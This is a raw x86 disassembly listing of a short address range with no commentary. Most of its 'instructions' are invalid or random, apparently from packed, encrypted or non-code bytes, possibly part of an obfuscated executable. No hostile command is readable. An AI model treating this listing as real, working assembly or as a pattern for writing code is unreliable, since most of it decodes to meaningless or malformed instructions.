  40ddaa:	xor    ah,BYTE PTR [ebx+0x62]
  40ddad:	xor    BYTE PTR [edi+0x40],cl
  40ddb0:	push   0x1b
  40ddb2:	jb     0x40dd42
  40ddb4:	sbb    dl,BYTE PTR ds:0xa7c3ff77
  40ddba:	sub    edx,DWORD PTR [edi]
  40ddbc:	xchg   DWORD PTR [edi-0x2b],esp
  40ddbf:	int3   
  40ddc0:	mov    bl,0x32
  40ddc2:	push   edi
  40ddc3:	xchg   esp,eax
  40ddc4:	(bad)  
  40ddc5:	hlt    
  40ddc6:	popa   
  40ddc7:	dec    ebp
  40ddc8:	mov    edx,ebx
  40ddca:	pop    es
  40ddcb:	mov    ebp,0x7160ce55
  40ddd0:	das    
  40ddd1:	sbb    cl,BYTE PTR [ecx]
  40ddd3:	jns    0x40dd71
  40ddd5:	sbb    BYTE PTR [edi+ebx*1+0x4e0917c4],al
  40dddc:	add    al,0x7b
  40ddde:	xchg   esi,eax
  40dddf:	fs lock in al,dx
  40dde2:	ror    DWORD PTR [edi-0x6d],0x69
  40dde6:	dec    BYTE PTR [edi]
  40dde8:	lock dec ebx
  40ddea:	push   edi
  40ddeb:	push   ds
  40ddec:	push   ebx
  40dded:	mov    ds:0xd2422171,eax
  40ddf2:	loope  0x40ddea
  40ddf4:	lods   al,BYTE PTR ds:[esi]
  40ddf5:	sub    eax,0xc7d0280a
  40ddfa:	mov    eax,ds:0xb179c50d
  40ddff:	add    BYTE PTR [edx+0x1ce56d9],0x50
  40de06:	dec    edx
  40de07:	enter  0x7367,0x7d
  40de0b:	push   esi
  40de0c:	retf   0x10d7
  40de0f:	push   edx
  40de10:	fucomi st,st(4)
  40de12:	imul   edi,DWORD PTR [edx-0x1759169d],0xe
  40de19:	add    al,0xef
  40de1b:	les    edx,FWORD PTR ds:0x3234bb12
  40de21:	repnz aad 0xb2
  40de24:	cs cs dec esp
  40de27:	call   0x17a:0x260bae7f
  40de2e:	inc    esi
  40de2f:	xchg   DWORD PTR [edi-0x59078f2e],esi
  40de35:	mov    eax,0x5835ab35
  40de3a:	adc    dh,BYTE PTR ds:0x1aa0c972
  40de40:	mov    edi,0x448b157e
  40de45:	loop   0x40de03
  40de47:	or     DWORD PTR ds:0xdbbd9e68,0x16c027e6
  40de51:	in     al,dx
  40de52:	add    DWORD PTR [ebp-0x32],ebp
  40de55:	outs   dx,BYTE PTR ds:[esi]
  40de56:	push   ebp
  40de57:	ja     0x40ddec
  40de59:	add    al,0x6b
  40de5b:	and    BYTE PTR [ebx+ebp*8],ch
  40de5e:	test   eax,0xbd8e1c6f
  40de63:	fadd   DWORD PTR ds:0x208b4117
  40de6a:	inc    edi
  40de6b:	aaa    
  40de6c:	clc    
  40de6d:	push   edi
  40de6e:	shr    DWORD PTR [esp+ebp*8],0xba
  40de72:	push   ebp
  40de73:	mov    esi,?
  40de75:	cmp    eax,0x2e44a914
  40de7a:	adc    BYTE PTR [edi+0x6b87f093],ch
  40de80:	cli    
  40de81:	and    edx,edi
  40de83:	mov    eax,0x372dc454
  40de88:	ins    BYTE PTR es:[edi],dx
  40de89:	gs mov ds,ecx
  40de8c:	sub    ah,BYTE PTR [ebx]
  40de8e:	enter  0x48df,0x32
  40de92:	push   ebx
  40de93:	inc    esi
  40de94:	inc    ecx
  40de95:	mov    ds:0xc4e24989,al
  40de9a:	(bad)  
  40de9c:	dec    edi
  40de9d:	jmp    0xf8e702a7
  40dea2:	pop    esp
  40dea3:	jmp    0xefe7:0x579f6389
  40deaa:	dec    eax
  40deab:	je     0x40de48
  40dead:	push   ebx
  40deae:	loop   0x40dee6
  40deb0:	push   0x3dacb452
  40deb5:	dec    esp
  40deb6:	test   eax,0xbda3413a
  40debb:	sub    dl,BYTE PTR [eax+0xc]
  40debe:	or     al,0xdf
  40dec0:	loop   0x40dee5
  40dec2:	cmp    al,0xbe
  40dec4:	xchg   BYTE PTR [ebx+0x42],bl
  40dec7:	sub    BYTE PTR [edi+eiz*4+0x2c],dl
  40decb:	call   0xe08d5c91
  40ded0:	pushf  
  40ded1:	data16 mov al,ds:0x65428ce
  40ded7:	(bad)  
  40ded8:	je     0x40df53
  40deda:	fstp   DWORD PTR [ecx+0x114c6b8d]
  40dee0:	shr    ecx,cl
  40dee2:	sub    dl,BYTE PTR [ebx+0x23]
  40dee5:	add    ecx,DWORD PTR [ecx]
  40dee7:	xchg   BYTE PTR ds:0xd05c6e3d,cl
  40deed:	jnp    0x40ded9
  40deef:	mov    bh,0x10
  40def1:	and    al,0x3b
  40def3:	adc    DWORD PTR [esi+0x4004b2bd],eax
  40def9:	and    al,cl
  40defb:	jb     0x40df6b
  40defd:	pushf  
  40defe:	mov    esp,0x4c788a1c
  40df03:	(bad)  
  40df05:	pop    ebp
  40df06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df07:	pushf  
  40df08:	test   DWORD PTR [ecx-0x140ea9b7],esi
  40df0e:	retf   
  40df0f:	cld    
  40df10:	jg     0x40de9f
  40df12:	shl    BYTE PTR [eax-0x5f8db74],1
  40df18:	jge    0x40deef
  40df1a:	xlat   BYTE PTR ds:[ebx]
  40df1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df1c:	xchg   edi,eax
  40df1d:	out    0x3,eax
  40df1f:	nop
  40df20:	(bad)  [esi]
  40df22:	or     al,ah
  40df24:	jle    0x40df34
  40df26:	dec    esp
  40df27:	mov    BYTE PTR [ecx],al
  40df29:	hlt    
  40df2a:	repnz mov ebp,ecx
  40df2d:	fimul  DWORD PTR [ecx]
  40df2f:	push   esp
  40df30:	lds    esp,FWORD PTR [ecx]
  40df32:	xchg   edx,eax
  40df33:	sub    ebp,DWORD PTR [esi]
  40df35:	dec    ecx
  40df36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df37:	push   es
  40df38:	jecxz  0x40df8b
  40df3a:	and    al,0x9
  40df3c:	mov    DWORD PTR [ecx+0x3f913d8b],edi
  40df42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df43:	adc    eax,0x4ae7d01b
  40df48:	mov    ah,0x50
  40df4a:	test   DWORD PTR [ebx+0x51],ecx
  40df4d:	lock jmp esp
  40df50:	jo     0x40df8d
  40df52:	idiv   DWORD PTR [esi]
  40df54:	(bad)  
  40df56:	ret    
  40df57:	sbb    BYTE PTR [edi+eax*4+0xd],al
  40df5b:	je     0x40dfa4
  40df5d:	xchg   esi,eax
  40df5e:	int    0x7f
  40df60:	push   ecx
  40df61:	call   0x40ec:0x93f3d475
  40df68:	mov    edi,0xd0f58fbb
  40df6d:	(bad)  
  40df6e:	mov    edi,0xc031305b
  40df73:	pushf  
  40df74:	jge    0x40df55
  40df76:	sbb    dh,BYTE PTR [ecx]
  40df78:	push   esi
  40df79:	aas    
  40df7a:	push   edx
  40df7b:	dec    ebx
  40df7c:	(bad)  
  40df7d:	fdiv   QWORD PTR [eax+0x78]
  40df80:	dec    esp
  40df81:	jns    0x40dfe1
  40df83:	clc    
  40df84:	mov    bl,BYTE PTR [edi+0xe9585e1]
  40df8a:	loop   0x40df82
  40df8c:	test   BYTE PTR [edi],bl
  40df8e:	inc    esp
  40df8f:	(bad)  
  40df90:	xor    DWORD PTR [ecx+0x2e410367],ebp
  40df96:	sbb    DWORD PTR [ebp-0x7d4ed13],edx
  40df9c:	pop    ss
  40df9d:	paddsw mm0,QWORD PTR [ebx]
  40dfa0:	dec    esi
  40dfa1:	jbe    0x40dfb1
  40dfa3:	push   ebx
  40dfa4:	xchg   edx,eax
  40dfa5:	sub    al,BYTE PTR [ecx+0x304a0df]
  40dfab:	ret    
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x740413a],1
  40dfde:	inc    ebp
  40dfdf:	call   0x78f3688c
  40dfe4:	js     0x40e01b
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40e02d
  40dfea:	pop    esi
  40dfeb:	cs (bad) 
  40dfed:	jbe    0x40e006
  40dfef:	sbb    bh,BYTE PTR [ebp-0x2d6b68b3]
  40dff5:	lds    esi,FWORD PTR [ebp-0x3168c82c]
  40dffb:	shr    DWORD PTR [ecx+ecx*4-0x6682b78a],0xcd
  40e003:	sub    DWORD PTR [esi+0x3e1d75ac],esi
  40e009:	jecxz  0x40dff9
  40e00b:	push   ebp
  40e00c:	pop    ebp
  40e00d:	test   al,0x7d
  40e00f:	mov    cl,dh
  40e011:	mov    cl,bh
  40e013:	shl    al,0x61
  40e016:	outs   dx,DWORD PTR ds:[esi]
  40e017:	cdq    
  40e018:	add    DWORD PTR [ebp+0x25],ebp
  40e01b:	xor    ebp,DWORD PTR [esi+0x20790977]
  40e021:	inc    eax
  40e022:	add    ecx,DWORD PTR [ebx]
  40e024:	sub    edi,DWORD PTR [edx+0x7]
  40e027:	add    DWORD PTR [eax+0x25],0xc9ed5d3c
  40e02e:	sbb    al,0x76
  40e030:	fbstp  TBYTE PTR [ecx+0x13]
  40e033:	sbb    eax,0xdb2ef0e9
  40e038:	ins    DWORD PTR es:[edi],dx
  40e039:	xcrypt-ecb (bad)
  40e03a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e03b:	iret   
  40e03c:	mov    ah,0xad
  40e03e:	push   ss
  40e03f:	inc    esi
  40e040:	jae    0x40e0a7
  40e042:	inc    ebp
  40e043:	jno    0x40e058
  40e045:	repnz mov ds:0x4be1af59,al
  40e04b:	push   edi
  40e04c:	std    
  40e04d:	add    eax,0x716e5307
  40e052:	xor    dh,ah
  40e054:	bound  ebx,QWORD PTR [esi+edx*2-0x62918389]
  40e05b:	inc    edi
  40e05c:	cmp    DWORD PTR [edi+eax*1],edi
  40e05f:	xchg   esi,eax
  40e060:	jp     0x40e0ba
  40e062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e063:	inc    edx
  40e064:	xchg   ebp,eax
  40e065:	or     BYTE PTR [ebp+0x24],cl
  40e068:	shl    al,1
  40e06a:	data16 cmc 
  40e06c:	lods   eax,DWORD PTR ds:[esi]
  40e06d:	add    DWORD PTR [ebp-0x60ef44f3],esp
  40e073:	fistp  WORD PTR [ecx]
  40e075:	xchg   esi,eax
  40e076:	adc    edx,DWORD PTR [edx+0x6e1c32d6]
  40e07c:	xchg   ecx,eax
  40e07d:	add    esi,esp
  40e07f:	dec    eax
  40e080:	push   0x4b90d069
  40e085:	ins    BYTE PTR es:[edi],dx
  40e086:	xor    eax,0x2bf493c2
  40e08b:	and    cl,bh
  40e08d:	xchg   ebx,eax
  40e08e:	je     0x40e05b
  40e090:	fisub  WORD PTR [eax+0x3388e5ff]
  40e096:	fisub  WORD PTR [esi+0x67]
  40e099:	mov    dh,0xbb
  40e09b:	aam    0x7c
  40e09d:	mov    ecx,ebp
  40e09f:	jne    0x40e0d6
  40e0a1:	test   BYTE PTR [edi+ecx*4-0x3e],dh
  40e0a5:	fcomip st,st(7)
  40e0a7:	cmp    al,0x90
  40e0a9:	stos   BYTE PTR es:[edi],al
  40e0aa:	xor    BYTE PTR [ebp-0x496298c1],0xe0
  40e0b1:	jo     0x40e07e
  40e0b3:	fcomi  st,st(1)
  40e0b5:	loop   0x40e046
  40e0b7:	xor    eax,0x41a3ecd1
  40e0bc:	les    edi,FWORD PTR [esi-0x36286a7d]
  40e0c2:	mov    bh,0x57
  40e0c4:	retf   0x6b8d
  40e0c7:	pop    ecx
  40e0c8:	mov    bh,0x6a
  40e0ca:	dec    eax
  40e0cb:	push   cs
  40e0cc:	(bad)  
  40e0cd:	xor    esp,DWORD PTR [ebp+0x3f]
  40e0d0:	rcl    BYTE PTR [esi+0x2b],cl
  40e0d3:	jg     0x40e0a6
  40e0d5:	add    BYTE PTR [eax],al
  40e0d7:	fwait
  40e0d8:	mov    al,ds:0x1e2e7de7
  40e0dd:	rol    ch,1
  40e0df:	gs xor eax,0x46f47f8a
  40e0e5:	shl    DWORD PTR [ebx-0x785bff71],0xf1
  40e0ec:	fcomp  st(1)
  40e0ee:	shl    DWORD PTR [ecx-0x6b],cl
  40e0f1:	cwde   
  40e0f2:	int3   
  40e0f3:	xor    eax,0x762bebe1
  40e0f8:	and    DWORD PTR [edx+ecx*1+0x3c],esi
  40e0fc:	test   al,0x27
  40e0fe:	jno    0x40e15d
  40e100:	shl    ebx,1
  40e102:	sbb    DWORD PTR [edi],ecx
  40e104:	ja     0x40e149
  40e106:	ret    0x6222
  40e109:	jmp    0xd8cc:0xe03c4c76
  40e110:	pop    ss
  40e111:	scas   al,BYTE PTR es:[edi]
  40e112:	mul    DWORD PTR [ecx+0x23]
  40e115:	test   DWORD PTR [eax+eax*4-0x1094ca03],edi
  40e11c:	loope  0x40e119
  40e11e:	push   esi
  40e11f:	lock sbb DWORD PTR ds:[edi-0x6e],0x1c6f60df
  40e128:	es out 0x4b,al
  40e12b:	adc    BYTE PTR [ebx-0x1f3e4852],bl
  40e131:	shl    BYTE PTR [eax-0x444de05a],0x44
  40e138:	xor    DWORD PTR [bp+si+0x7956],esi
  40e13d:	sti    
  40e13e:	mov    DWORD PTR [esi+0x54],edx
  40e141:	jns    0x40e113
  40e143:	test   al,0x5b
  40e145:	fst    DWORD PTR [ebx-0x3b]
  40e148:	jmp    0x4326:0x367eff02
  40e14f:	vpaddb ymm2,ymm7,YMMWORD PTR [edi+0x73]
  40e154:	and    ebp,DWORD PTR [ebx]
  40e156:	xchg   esp,eax
  40e157:	sub    eax,DWORD PTR [ecx+ebp*4]
  40e15a:	xor    bl,BYTE PTR [edx]
  40e15c:	mov    al,ds:0x51d47e72
  40e161:	bswap  eax
  40e163:	add    edi,DWORD PTR [esp+ebp*4-0x17edd7e]
  40e16a:	push   edi
  40e16b:	adc    eax,0x9e909eb2
  40e170:	ins    DWORD PTR es:[edi],dx
  40e171:	pause  
  40e173:	xchg   edx,eax
  40e174:	shl    ebx,0xaa
  40e177:	stc    
  40e178:	pushf  
  40e179:	inc    ebp
  40e17b:	pop    esi
  40e17c:	cld    
  40e17d:	in     eax,0x81
  40e17f:	mov    DWORD PTR ds:0xc4a9143e,esp
  40e185:	xchg   ebp,eax
  40e186:	call   0x93f69f25
  40e18b:	in     al,dx
  40e18c:	jnp    0x40e1fa
  40e18e:	(bad)  
  40e18f:	(bad)  
  40e190:	jge    0x40e187
  40e192:	or     al,0x38
  40e194:	jecxz  0x40e11b
  40e196:	cmp    al,BYTE PTR [edi+0x6e6816a2]
  40e19c:	jle    0x40e1c9
  40e19e:	in     eax,dx
  40e19f:	aad    0xd3
  40e1a1:	xchg   DWORD PTR [ebx-0x55ad66b1],edi
  40e1a7:	and    cl,BYTE PTR [ebp+0x12]
  40e1aa:	mov    dh,0xf9
  40e1ac:	pusha  
  40e1ad:	jnp    0x40e186
  40e1af:	jb     0x40e1a4
  40e1b1:	stos   DWORD PTR es:[edi],eax
  40e1b2:	sbb    BYTE PTR [ebp+0xe3bd278],ah
  40e1b8:	sub    BYTE PTR [edx],al
  40e1ba:	sub    DWORD PTR [edx],edi
  40e1bc:	and    bh,BYTE PTR ds:0x2e3db442
  40e1c2:	pushf  
  40e1c3:	mov    BYTE PTR [ecx-0x43],bh
  40e1c6:	sub    eax,0xb52b8a3f
  40e1cb:	dec    esp
  40e1cc:	mov    ds:0xb983e43c,al
  40e1d1:	xor    bh,BYTE PTR [ebx+ecx*2-0x10]
  40e1d5:	test   DWORD PTR [ecx-0x6a2174a],ecx
  40e1db:	add    DWORD PTR [edi-0x65f8fc58],ebx
  40e1e1:	ins    DWORD PTR es:[edi],dx
  40e1e2:	inc    esp
  40e1e3:	mov    edx,0xe1bd326e
  40e1e8:	pop    ds
  40e1e9:	sti    
  40e1ea:	push   eax
  40e1eb:	pop    esp
  40e1ec:	pop    edx
  40e1ed:	adc    DWORD PTR [edx+ebp*8-0x5bd6da40],edi
  40e1f4:	popf   
  40e1f5:	cmp    al,0xe7
  40e1f7:	pushf  
  40e1f8:	es nop
  40e1fa:	mov    bl,ah
  40e1fc:	leave  
  40e1fd:	jmp    0x67fa:0xc3cba0af
  40e204:	ss syscall 
  40e207:	dec    edi
  40e208:	iret   
  40e209:	out    0x12,al
  40e20b:	sbb    DWORD PTR [esp+ebp*4-0x237a2e0c],edx
  40e212:	out    0x9a,al
  40e214:	lahf   
  40e215:	fsubr  QWORD PTR [ebx+0xcf44aa9]
  40e21b:	and    cl,BYTE PTR fs:[edi]
  40e21e:	mov    BYTE PTR [ebx-0x6f],al
  40e221:	xor    edx,DWORD PTR [ebp+0x40]
  40e224:	xor    eax,esi
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	cmp    ebx,eax
  40e23c:	fidivr WORD PTR [edx+0x45]
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e279
  40e247:	xchg   esp,eax
  40e248:	repnz sbb ecx,DWORD PTR [eax+0x548fa1db]
  40e24f:	mov    ch,0x3a
  40e251:	inc    esi
  40e252:	mov    esi,0xc26639b3
  40e257:	shl    DWORD PTR [edi+0x45],cl
  40e25a:	addr16 iret 
  40e25c:	int    0x51
  40e25e:	sbb    BYTE PTR gs:[edi],bl
  40e261:	sub    al,0x2e
  40e263:	ror    BYTE PTR [esi+0xa32d7a],0xf1
  40e26a:	jns    0x40e2d9
  40e26c:	bound  ebp,QWORD PTR [eax-0x80]
  40e26f:	fmul   st,st(7)
  40e271:	fbld   TBYTE PTR [edx]
  40e273:	mov    esi,0xe2fb0ee3
  40e278:	iret   
  40e279:	jns    0x40e296
  40e27b:	xchg   esi,eax
  40e27c:	or     al,0xea
  40e27e:	mov    esi,0x29887576
  40e283:	fwait
  40e284:	xchg   ecx,eax
  40e285:	and    ah,dh
  40e287:	and    BYTE PTR [esp+ebx*8-0x47b2bf49],dh
  40e28e:	rol    DWORD PTR [esi],1
  40e290:	push   ecx
  40e291:	dec    ebx
  40e292:	out    dx,eax
  40e293:	pop    edx
  40e294:	leave  
  40e295:	and    eax,0xa84ba04b
  40e29a:	and    al,0xa0
  40e29c:	dec    eax
  40e29d:	(bad)  
  40e29f:	aas    
  40e2a0:	repnz xor ebx,DWORD PTR [edi-0x6b]
  40e2a4:	xchg   esp,eax
  40e2a5:	inc    ebp
  40e2a6:	jns    0x40e288
  40e2a8:	out    dx,al
  40e2a9:	data16 cs ja 0x40e2fb
  40e2ad:	or     DWORD PTR [eax+0x2b31f90d],edi
  40e2b3:	fisub  WORD PTR [esi]
  40e2b5:	jge    0x40e2cb
  40e2b7:	iret   
  40e2b8:	dec    ebp
  40e2b9:	in     eax,dx
  40e2ba:	ficomp DWORD PTR [edx-0x45]
  40e2bd:	dec    ebp
  40e2be:	sub    esi,DWORD PTR [esi-0x431c1cb9]
  40e2c4:	mov    ecx,0x732d9043
  40e2c9:	loope  0x40e283
  40e2cb:	jmp    0x588b:0x9d33b483
  40e2d2:	in     al,dx
  40e2d3:	adc    ch,0x8e
  40e2d6:	test   BYTE PTR ds:0x47042cd,dh
  40e2dc:	cld    
  40e2dd:	mov    esi,ebx
  40e2df:	dec    esp
  40e2e0:	cmp    DWORD PTR [edx],ebx
  40e2e2:	ins    BYTE PTR es:[edi],dx
  40e2e3:	call   0xc9bc:0x8ad3e0bb
  40e2ea:	xor    al,0xe6
  40e2ec:	xor    al,0x7b
  40e2ee:	or     cl,BYTE PTR [ebp+eax*1-0x6e54e6f6]
  40e2f5:	xor    BYTE PTR [edx-0x78],0x34
  40e2f9:	pusha  
  40e2fa:	(bad)  
  40e2fb:	and    al,0x32
  40e2fd:	sub    eax,0x6611c895
  40e302:	dec    ebp
  40e303:	jecxz  0x40e2d2
  40e305:	das    
  40e306:	retf   0x3d8a
  40e309:	aas    
  40e30a:	mov    dh,0xe9
  40e30c:	add    eax,0xb1747d6b
  40e311:	mov    eax,0x609de6
  40e316:	mov    ds,WORD PTR [ebp+0x682212e8]
  40e31c:	(bad)  
  40e31d:	(bad)  
  40e31e:	push   ecx
  40e31f:	les    eax,FWORD PTR [ebx]
  40e321:	sbb    al,ch
  40e323:	rcl    bl,1
  40e325:	dec    esp
  40e326:	push   esp
  40e327:	call   0x5232:0xf0d60726
  40e32e:	ficomp DWORD PTR [ecx-0x5b1049e5]
  40e334:	push   esi
  40e335:	loop   0x40e2ca
  40e337:	pop    esi
  40e338:	sub    DWORD PTR ds:0x2fc8fe95,eax
  40e33e:	cwde   
  40e33f:	cli    
  40e340:	jle    0x40e3a8
  40e342:	sbb    eax,0x3dc87445
  40e347:	jg     0x40e393
  40e349:	mov    cl,0x87
  40e34b:	fstp   st(7)
  40e34d:	out    0x31,eax
  40e34f:	push   eax
  40e350:	pop    ds
  40e351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e352:	mov    ebp,0x5b40bafe
  40e357:	mov    eax,ds:0x40918818
  40e35c:	les    ebx,FWORD PTR [esi+0x3a48661e]
  40e362:	xlat   BYTE PTR ds:[ebx]
  40e363:	xor    al,0xd2
  40e365:	pop    esp
  40e366:	inc    eax
  40e367:	arpl   WORD PTR [ebp-0x67],dx
  40e36a:	pop    es
  40e36b:	sbb    BYTE PTR [edx-0x6cb9fe97],ah
  40e371:	and    edx,DWORD PTR [esi]
  40e373:	hlt    
  40e374:	in     al,0x48
  40e376:	pushf  
  40e377:	jmp    0x40e354
  40e379:	fcmove st,st(6)
  40e37b:	xlat   BYTE PTR ds:[ebx]
  40e37c:	loope  0x40e333
  40e37e:	fmul   QWORD PTR [ebp-0x75]
  40e381:	adc    eax,0x35e2a30a
  40e386:	(bad)  
  40e388:	jnp    0x40e3ef
  40e38a:	push   eax
  40e38b:	mov    ds:0xcafb107a,al
  40e390:	xchg   ecx,eax
  40e391:	in     al,dx
  40e392:	stos   BYTE PTR es:[edi],al
  40e393:	push   es
  40e394:	pop    ebx
  40e395:	imul   edi,esp,0xffffffb0
  40e398:	jecxz  0x40e3e3
  40e39a:	in     al,0xfe
  40e39c:	outs   dx,BYTE PTR ds:[esi]
  40e39d:	adc    cl,dl
  40e39f:	mov    ebx,0x28a092d3
  40e3a4:	jge    0x40e36b
  40e3a6:	data16 cmp al,0x15
  40e3a9:	mov    esi,DWORD PTR [esp+esi*1+0x0]
  40e3ad:	iret   
  40e3ae:	dec    ecx
  40e3af:	mov    bh,0x7f
  40e3b1:	lahf   
  40e3b2:	sar    edx,0x8d
  40e3b5:	(bad)  
  40e3b6:	pop    esi
  40e3b7:	jns    0x40e36c
  40e3b9:	cmc    
  40e3ba:	iret   
  40e3bb:	iret   
  40e3bc:	sub    al,0x73
  40e3be:	in     eax,0xdd
  40e3c0:	mov    eax,0xdcc1db59
  40e3c5:	jo     0x40e3a7
  40e3c7:	pop    eax
  40e3c8:	xor    eax,0x26cbc0f3
  40e3cd:	fwait
  40e3ce:	push   ds
  40e3cf:	cwde   
  40e3d0:	pop    esp
  40e3d1:	enter  0xb490,0xac
  40e3d5:	jae    0x40e444
  40e3d7:	frstor [ecx]
  40e3d9:	mov    cl,0x65
  40e3db:	adc    DWORD PTR [edi],ecx
  40e3dd:	xchg   edx,eax
  40e3de:	scas   eax,DWORD PTR es:[edi]
  40e3df:	mov    ebx,0xa11e9e81
  40e3e4:	mov    ebx,0xef09814f
  40e3e9:	test   eax,0xcef6deeb
  40e3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3ef:	fcmovnbe st,st(7)
  40e3f1:	xchg   ebp,eax
  40e3f2:	jmp    0x40e377
  40e3f4:	mov    edi,0x7c52c326
  40e3f9:	push   ds
  40e3fa:	fimul  DWORD PTR [esi-0xcada243]
  40e400:	fcomp  QWORD PTR ds:0x17860fa9
  40e406:	out    dx,al
  40e407:	cld    
  40e408:	sbb    al,0x7a
  40e40a:	push   esp
  40e40b:	mov    bl,0x14
  40e40d:	aaa    
  40e40e:	xchg   ecx,eax
  40e40f:	mov    edx,0x2fe23918
  40e414:	and    esi,DWORD PTR [esi]
  40e416:	repz jg 0x40e3ef
  40e419:	add    DWORD PTR [eax+eax*8-0x1cdac823],0xffffffe9
  40e421:	rcr    BYTE PTR [ecx+0x71],1
  40e424:	inc    ebx
  40e425:	fwait
  40e426:	test   BYTE PTR [esi+0x7b],bh
  40e429:	hlt    
  40e42a:	sbb    BYTE PTR [ebx-0x38],bl
  40e42d:	xlat   BYTE PTR ds:[ebx]
  40e42e:	ret    
  40e42f:	push   0xf1885706
  40e434:	gs push edi
  40e436:	xchg   ebx,eax
  40e437:	aaa    
  40e438:	shr    dl,cl
  40e43a:	jmp    0x40e42d
  40e43c:	jbe    0x40e406
  40e43e:	fiadd  WORD PTR [edx+0x20]
  40e441:	in     al,0xb8
  40e443:	mov    DWORD PTR [edi+0x1bc7027f],edx
  40e449:	mov    esp,0x717ed8bd
  40e44e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e44f:	retf   0x5c05
  40e452:	popf   
  40e453:	(bad)  
  40e454:	push   esi
  40e455:	retf   
  40e456:	add    BYTE PTR [esi-0x6da163b9],cl
  40e45c:	sti    
  40e45d:	cld    
  40e45e:	cmp    BYTE PTR [ebx-0x62],al
  40e461:	shl    esi,cl
  40e463:	jl     0x40e4c7
  40e465:	mul    DWORD PTR [eax+0x7ecf321b]
  40e46b:	inc    ebx
  40e46c:	jp     0x40e47d
  40e46e:	push   ecx
  40e46f:	sub    al,bl
  40e471:	dec    esi
  40e472:	xchg   edi,eax
  40e473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e474:	add    ah,dl
  40e476:	jo     0x40e45b
  40e478:	int3   
  40e479:	hlt    
  40e47a:	dec    ebx
  40e47b:	fdivr  QWORD PTR [eax+0x5d078be9]
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebx,DWORD PTR [eax+0x2fd372b]
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e4fb
  40e4c4:	xchg   edi,eax
  40e4c5:	inc    edi
  40e4c6:	ret    
  40e4c7:	addr16 push eax
  40e4c9:	fidivr DWORD PTR [ebx+0x40e02175]
  40e4cf:	sbb    eax,0xbea889b1
  40e4d4:	out    dx,al
  40e4d5:	out    0x9,eax
  40e4d7:	mov    ebx,0x261b3a2e
  40e4dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4dd:	scas   al,BYTE PTR es:[edi]
  40e4de:	les    edi,FWORD PTR [ebp+0x56]
  40e4e1:	out    0xcd,eax
  40e4e3:	inc    esp
  40e4e4:	ds add eax,0x286125fe
  40e4ea:	or     al,0x53
  40e4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ed:	jb     0x40e4e4
  40e4ef:	mov    ds:0x7164692f,eax
  40e4f4:	(bad)  
  40e4f5:	mov    al,0x36
  40e4f7:	sub    dl,BYTE PTR [eax]
  40e4f9:	out    dx,al
  40e4fa:	sub    BYTE PTR [ecx+0x46],cl
  40e4fd:	lods   al,BYTE PTR ds:[esi]
  40e4fe:	xchg   edi,eax
  40e4ff:	or     eax,0x38d3c038
  40e504:	push   esp
  40e505:	xchg   edi,eax
  40e506:	sar    DWORD PTR [ebx+ebx*8+0x14],cl
  40e50a:	mov    esp,0x4ee86782
  40e50f:	rol    BYTE PTR [eax],cl
  40e511:	(bad)  
  40e512:	shr    BYTE PTR [ecx-0x36],cl
  40e515:	cmp    ecx,DWORD PTR [edx+0x2a8a4288]
  40e51b:	test   al,0x71
  40e51d:	cmp    al,0x8b
  40e51f:	and    DWORD PTR [ebp+0x4],0xcb0894f5
  40e526:	inc    edx
  40e527:	call   0x9027:0x380ad4f6
  40e52e:	mov    DWORD PTR [eax+0x6a],edx
  40e531:	inc    edx
  40e532:	and    eax,0x61e81a9f
  40e537:	xor    dh,al
  40e539:	jne    0x40e599
  40e53b:	in     al,0x6e
  40e53d:	rol    al,0x5
  40e540:	adc    DWORD PTR fs:[ebp+0x34d56e40],edx
  40e547:	gs stos DWORD PTR es:[edi],eax
  40e549:	out    dx,al
  40e54a:	mov    ebp,0x2a7ebd6f
  40e54f:	jl     0x40e4f8
  40e551:	jecxz  0x40e586
  40e553:	mov    dl,0x12
  40e555:	dec    esp
  40e556:	add    ebp,eax
  40e558:	sub    eax,0xd50430ef
  40e55d:	pop    es
  40e55e:	(bad)  
  40e55f:	mov    ch,0x4a
